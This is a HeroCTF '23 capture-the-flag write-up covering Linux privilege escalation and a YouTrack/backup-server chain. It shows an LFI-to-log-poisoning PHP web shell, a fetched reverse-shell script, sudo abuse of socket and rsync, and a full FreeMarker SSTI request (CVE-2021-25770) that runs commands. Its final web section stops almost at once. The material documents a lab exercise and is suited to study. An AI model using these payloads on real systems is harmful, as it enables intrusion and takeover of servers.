<h3> HeroCTF '23 </h3>

Here are the challenges I was able to solve:

```
P.S:- The scoreboard was dynamic
```

# Challenges Solved

## Prog
-      Math Trap (50 points)

## System
-     Chm0d (50 points)
-     IMF#0 (50 points)
-     SUDOkLu (50 points)
-     IMF#1: Bug Hunting (500 points)
-     IMF#2: A woman's weapon (500 points)
-     IMF#3: admin:admin (500 points)
-     IMF#4: Put the past behind (500 points)

# Web
- Referrrrer (500 points)
- Drink from my Flask#1 (500 points)

# Prog

#### Math Trap
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c95cf4e2-bb75-4f89-8ef0-4cd610d630d6)

Since we're given a remote service to connect to let us see what it does

Connecting to it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8e1ad6a9-5129-4f1d-b4fe-effcfb7ce99c)

We're asked a calculation 

I used python to evaluate the question and then after getting the answer and giving the remote service the answer I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/17a26531-73a2-4f90-9c0e-57421c8b6c48)

I got *Too Slow* so basically we need to solve each math it gives

And doing this manually is not possible cause it also checks the answer received with time

The way forward is by scripting it and that's what I did

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/heroctf/prog/Math%20Trap/solve_2.py) it's not really well scripted but it does the job 😄

Running it gives the flag 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/818ff725-48f2-4ec3-b982-13f4829581dd)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3d3907c-31d6-42a6-b92c-37023db686a8)

```
Flag: Hero{E4sy_ch4ll3ng3_bu7_tr4pp3d}
```

# System

#### Chm0d 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0b569148-b584-4fa0-901c-c64d4919d4fc)

I had to first deploy an instance
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ce755e31-79e2-418f-ac2b-477f906be97f)

Now I logged in using the cred given
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0d5c3534-b8ed-4296-bb6a-a2fc9323c8fe)

Checking the */* directory shows that the flag is there
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2686b438-5520-41cb-ba3d-af84ee28cad7)

And noticing the permission set on it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6f9b086f-cbeb-414a-b78b-7ab8b0706a9a)

At the moment we don't have any read/write/execute permission over the file

But since the file is owned by us so, we can change the permission set on it using *chmod*

Trying it gives permission denied
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/126f0bca-845b-4fac-806d-ccd92a1b35f8)

Hmmmmm let us see what permission is set on the chmod binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3c49ca86-48cb-4ac0-a6af-85f8ab2b1678)

Dang it's permission is the same as the flag.txt file and since the binary is owned by root we can't change it

At this point I taught I had to do privilege escalation so using *scp* I transferred *linpeas.sh* to the box
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c5419c36-de68-4d58-93ae-1cb369259264)

I immediately noticed that the linpeas i transferred has execute permission set on it 

So maybe any file that is transferred to the box will automatically have execute perm set on it

This is good cause now I can upload my own machine *chmod* binary to the box then run it

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f3235ee6-2bb5-44c1-89d0-73a102aa99e3)

Now that we have chmod binary on it which has execute permission we can then change the permission on the flag file then read it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a23b27b2-5821-46a9-ba72-bc414feac8ba)

```
Flag: Hero{chmod_1337_would_have_been_easier}
```

#### IMF#0: Your mission, should you choose to accept it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4531861-09dc-4f2f-bb2b-0d9bc5b2dae1)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a4d13a67-eeba-4c9b-8b77-ebf99bbe65d4)

This is just the message asking if we accept the upcoming mission

And the flag is just right there

```
Flag: Hero{I_4cc3pt_th3_m1ss10n}
```

#### SUDOkLu
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/edad7b26-fcc7-47d9-b996-f56b28f259ba)

First I started an instance
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cc8d7191-157c-4594-b590-f9af3aaf750b)

Then i logged in to ssh
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ea098a6-d122-4d88-9dcc-7e31c98c903d)

We know that the goal is to read the file at `/home/privilegeduser/flag.txt`

But we are currently user `user` so we will be doing some privilege escalation

Checking for sudo permission shows that we can run */usr/bin/socket* as user *privilegeduser*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5f442fee-cf1c-4ae7-95c2-f3fde4f9abb6)

Moving over to [gtfobins](https://gtfobins.github.io/gtfobins/socket/) shows that we can get a reverse shell via the socket binary
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/61d8167d-4d94-4ca4-bd5d-6b9a90754dd3)

We were given the internal IP for the machine and luckily there's netcat on the machine
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f885fb67-8a96-4cd2-b9fd-0b3a723cee35)

So we'll be using nc to catch the reverse shell

I ssh to another session where my reverse shell will be caught
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c8984fb1-a0b7-4732-a34a-bfe3b137788a)

And we get the flag

```
Flag: Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
```

#### IMF#1: Bug Hunting
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/807bd6ce-c01a-4539-b5c3-424c9f467f78)

I started an instance as usual first
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/afb3e9b9-71fc-4316-9651-7f6a52584c91)

Remember initially we were given the cred to ssh which is `bob:password`

We're given two boxes attempting to login to ssh with the first host fails
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1dfc0235-e19e-4e13-9ae4-191eb5e73c31)

But for the second one it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac79ec0c-6fd7-4a02-824f-111bb4b65ccc)

There's a *welcome.txt* in the user's home directory

Checking it's content gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3172d0a2-7167-4710-825d-822e15a1ba21)

```
Hi Bob!

Welcome to our firm. I'm Dave, the tech lead here. We are going to be working together on our app.

Unfortunately, I will be on leave when you arrive. So take the first few days to get familiar with our infrastructure, and tools.

We are using YouTrack as our main issue tracker. The app runs on this machine (port 8080). We are both going to use the "dev" account at first, but I will create a separate account for you later. There is also an admin account, but that's for our boss. The credentials are: "dev:aff6d5527753386eaf09".

The development server with the codebase is offline for a few days due to a hardware failure on our hosting provider's side, but don't worry about that for now.

We also have a backup server, that is supposed to backup the main app's code (but it doesn't at the time) and also the YouTrack configuration and data.

Only I have an account to access it, but you won't need it. If you really have to see if everything is running fine, I made a little utility that run's on a web server.

The command to check the logs is:
curl backup

The first backups might be messed up a bit, a lot bigger than the rest, they occured while I was setting up YouTrack with it's administration account.
Hope you find everything to you liking, and welcome again!

Dave
```

After reading it here's what I understood from it:
- There's a web server which is running YouTrack hosted on port 8080
- We are already given the dev credential 
- There is also a backup server and to access it is by using curl which just checks the log 
- Hint pointing at the which backup file the YouTrack administrator password is stored

Since there's a web server hosted locally and it is running YouTrack, I used ssh portforward to make it accessible to my host
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/47e5388d-bee5-4251-8de8-c8352823d58f)

```
Command: ssh -L 8000:127.0.0.1:8080 bob@dyn-05.heroctf.fr -p13654
```

We can confirmed it worked by scanning our host
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/547f4d55-b183-4ea6-a0ea-51acec450635)

Dave gave us the dev user credential to be `dev:aff6d5527753386eaf09`

Moving over to my web browser shows a login page
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8095f857-5bca-46ba-adba-79447d8dc5f7)

Using the credential works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6d09fe46-c1e5-411b-a4d5-997e4a04a938)

Next thing I noticed is the verson of the web app which is:

```
YouTrack 2020.5.2579 
```

Searching for exploits leads [here](https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e4439eb3-6d6e-4754-ac09-28189c9d483b)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d1318468-5d1a-45d6-b192-91dc929493e1)

But after reading the exploit which is basically exploiting Server Side Template Injection (SSTI) it requires a privileged admin user account and our account isn't an admin account so let us put this aside for now

Looking through the web app shows this issue page
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fb350698-c2a2-458e-9876-acac539e8f8d)

Clicking on the first issue gives the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e6a04139-2589-426c-97d8-979439fadaa3)

```
Flag: Hero{1_tr4ck_y0u_tr4ck_h3_tr4ck5}
```

#### IMF#2: A woman's weapon
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/20cd5a36-475f-4b17-966f-6279b21e9a8e)

I got third blood in this challenge hahaha 🩸
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d5faa8e-c98f-4827-862d-134d196f2234)

Now back to the web app

The other issues are not of importance except this one
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/40255124-e74f-4280-ad9d-ed50b0cf8df1)

It's talking about the *Backup Log checking utility* and remember that *Dave* said there's a backup server

I downloaded the script to my host and here's the content
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a96ecdae-a0dd-4d3b-8c7e-ee100884a30a)

```php
<?php
    $file = $_GET['file'];
    if(isset($file))
    {
        include("$file");
    }
    else
    {
        include("/var/log/backup.log");
    }
?>
```

Now if you remember that *Dave* said the command to check the log is *curl backup* so this means that backup is a web server running on port 80

Pinging it from the host we currently have access to shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f07694be-5451-4f19-866a-e15c630b34ea)

So basically this is the second host as we can tell from it's ip *i.e the box that when we tried loggin to ssh didn't work*

For us to access the host we need to port forward it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bab12814-abe4-4a4d-a15e-ede1423c80ca)

Now we can access it from our host
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/52ba9d8d-a502-4484-9e5b-b5887ab2ceb1)

But it returns the backup log file and this is intended cause no file parameter was passed in the url

Back to the script we can see it uses *include* to get the content of the file passed in the *$file* parameter and this vulnerable to Local File Inclusion (LFI) due to the usage of *include*

Let us confirm it first
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b0f18a22-6a71-40d3-a1b8-22a92042f7c2)

Cool it works. At this point let's further exploit this vulnerability to get Remote Code Execution (RCE)

There are various ways or achieving this but in this case i'll go with Log Poisoning

First lets determine what web server this web app is built on

Using wappalyser extension i achieved that though you can use nmap,curl,http-header to fingerprint that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8ce3e9ed-c1d4-49a8-9dee-f096f76ebaab)

The web server is *Nginx*. This is needed cause for log poisoning, we need to know where the log files are placed

And from Nginx it's default is:

```
/var/log/nginx/access.log
```

Including the log file works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a7c8a7ac-c8fd-4fb1-bd83-a147989d6e99)

So let us go ahead with the attack

I used burp to work with the header manipulation
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57536df4-7003-4847-ba10-bd0bdf2122b6)

First thing to do is to inject this php code in the user-agent header
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7fe60d2d-16ee-4567-815b-0c64978536b3)

```php
<?php system($_GET['cmd']); ?>
```

Also forward the request at least three times for it to appear in the log file

From here we can get code execution
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a5cb8e0b-7a05-4220-a71d-1013a20c3a46)

Looking at the result we see that we are user `www-data`

Let us get a reverse shell. 

Since there's already nc on the other host, I just used it to host a python web server which contains a file *lol.sh* and the file content is that of a bash reverse shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/606d2b8e-2eea-477f-b187-f6e703339f7c)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cc38bd4e-ca42-4521-ab19-25de8e2c1722)

Now i will make the file at */tmp/lol.sh* executable then run it and hope to catch my reverse shell in my listener
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2bbf4f95-ff77-4609-a0db-493fb0ffc063)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d202a735-7e13-4d33-b4f0-bc91b2e0ff3d)

Back on our listener for our shell fingers crossed 🤞
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d8226940-56ef-49c0-a450-8c29883276ec)

Let us now stabilize it using python
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f67e2b1e-738a-4fe5-b332-f3781fa0d9c4)

User www-data is less privileged so lets see how we can escalate privilege

Running *sudo -l* shows that user *www-data* can run */usr/bin/rsync* as user *backup*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b7db3689-03c3-499d-8dbc-c9fd6e3b5d3d)

Moving over to [gtfobins](https://gtfobins.github.io/gtfobins/rsync/#sudo) shows a way we can abuse the permission to get shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0795b827-5180-4101-aed2-6fb2f906fc00)

Trying it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/29f8c5e2-de28-47bb-ae96-4be32a9fa325)

Now that we are user *backup* lets see what we have access to
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0407c34a-f8bd-416a-8cb3-400b35f0a076)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1e5bfa5f-0857-4562-8f75-b41c06e0fdf4)

Nice let's see what's in /backup
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f9e44c85-c543-4d01-865e-c67f3afa0794)

Our flag is in there also
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b8857b7c-db15-4182-856d-1bcf602e7bcc)

```
Flag: Hero{n0t_0nly_hum4ns_c4n_b3_po1s3n3d}
```

#### IMF#3: admin:admin
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7948995e-ec51-4342-b6a4-e23e98abe3a9)

I got 2nd blood on this challenge 🩸
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eece97e9-dbd0-4206-91da-808dcbacca03)

From the challenge description it seems we're to find credential of the admin user

And looking at our current working directory shows multiple zip files
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3ba10c4-868b-45e4-b8e7-ae7ec6698994)

If we were to find a password it would be quite stressfull as this zip files are much 

But now remember the hint from the note Dave gave:

```
The first backups might be messed up a bit, a lot bigger than the rest, they occured while I was setting up YouTrack with it's administration account.
Hope you find everything to you liking, and welcome again!
```

This is great cause now we can limit our search to a precise file

And what we can use is the file size and also date 

Looking at the result we can see that the best zip file to be searched is *youtrack-1683836642.zip*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/94424654-2f43-4996-8ce2-04cc941617a3)

Reason is because:
- It's file size is different from the other files
- The time it was created is one day different than the others which are just the same

Now that we've proposed our theory let us now unzip it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8e1e756d-8116-4412-9871-d32a7c36820b)

Searching through each of the files is stressfull so I used *grep* to recursively search for the string *password*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5a909c85-5565-4427-b1c4-f4b2b2390c91)

We see a password which looks like what a real admin would use haha

So the cred is likely `admin:Th1sIsAV3ryS3cur3Adm1nP4ssw0rd0101#`

Since *Dave* was referring to the cred of the *YouTrack* web service let us try logging in as admin using this newly found password
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eef55085-c232-452e-b9f7-c4baf0339480)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/03551e1c-dccf-41a4-8732-208906fe3a09)

Cool since we're admin we can further exploit this web app

Remember that we got a [vulnerability](https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html) which took exploited the web app via SSTI 

Following the instruction lead to remote code execution
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d6db81a-1d45-4399-bea5-af2a96e2b83f)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/400bccd6-7af0-4237-868d-32ff3b7b803d)

We are user *dave* 

I made it list the files in dave's directory
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53dbc37f-5d83-4151-b1bf-d62975db0760)

From here we can cat the file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bb01b081-190d-4cb0-b7c0-9f7ad44a63b2)

Here's my request

```
POST /api/admin/notificationSupplement/preview?$top=-1&fields=output,issueId,error HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8000/admin/notificationTemplates/article_digest_subject
Content-Type: application/json;charset=utf-8
Authorization: Bearer 1683981421136.be561191-dbd3-4457-86f5-592c273d3a82.1e31bb66-596d-41d6-9137-09b74c484055.be561191-dbd3-4457-86f5-592c273d3a82 6ab631e2-61a7-4806-b029-44f0753fc29a 0-0-0-0-0;1.MCwCFEzJ/cvlsEpm0ynQY+gvxuTKdWzzAhQeiLQA+N86lO1dXGbNEVtoBGuacw==
Content-Length: 421
Origin: http://localhost:8000
Connection: close
Cookie: i_like_gogs=8e9ae9c0377d4e18; i_like_gitea=f8bf16c31150322e; lang=en-US; YTJSESSIONID=node0dmm9xnxqzju510a8uh9375heq13.node0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{
  "template": {
      "fileName": "article_digest_subject.ftl",
      "content":"<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"cat /home/dave/flag.txt\")}"
  }
}
```

And here's the flag:

```
Flag: Hero{pl41nt3xt_p4ssw0rd_4nd_s5t1_b1t_much_41nt_1t?}
```

#### IMF#4: Put the past behind
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/92b0d5a2-baba-4359-afb8-5a4e9aaf49db)

I got 2nd blood on this challenge also 🩸
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/eece97e9-dbd0-4206-91da-808dcbacca03)

Let us get this over with 🙂

Since we already have code execution on the box let's see if we can get shell

I checked if there was any ssh key for user dave and there wasn't
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4eb42fd2-0115-4dc2-a1c3-8cb0deb3e842)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0abec2dc-c8fc-47eb-b015-96203fc21d71)

But I noticed a file *randomfile.txt.enc* and also *.bash_history* in the user dave directory so i copied it to /tmp
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6dc11b31-1c6e-4d0f-9440-a7a72d6a31ee)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e55f7832-cdad-4b91-ac6b-3495b795f301)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f75d0b9f-a57a-41aa-9b4f-616350879aad)

Back on the box we can now access the file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f82cab2c-3bbc-4f5c-b275-743ffc9af0db)

We see that this is the command used to create the *radnomfile.txt.enc*:

```
openssl aes-256-cbc -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt -out randomfile.txt.enc
```

It's using open ssl aes encryption to decrypt it this is the command:

```
openssl aes-256-cbc -d -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt.enc -out randomfile.txt.dec
```

Running that decrypts the file and I got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5a5aa8e5-98a9-4043-9e83-a413fbc3b958)

```
Flag: Hero{4_l1ttle_h1st0ry_l3ss0n_4_u}
```

# Web

#### Referrrrer
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/076690c3-0ed8-4879-801d-a76742d1eb31)

After downloading the source code and unzipping it I got this

And we're done 🙂
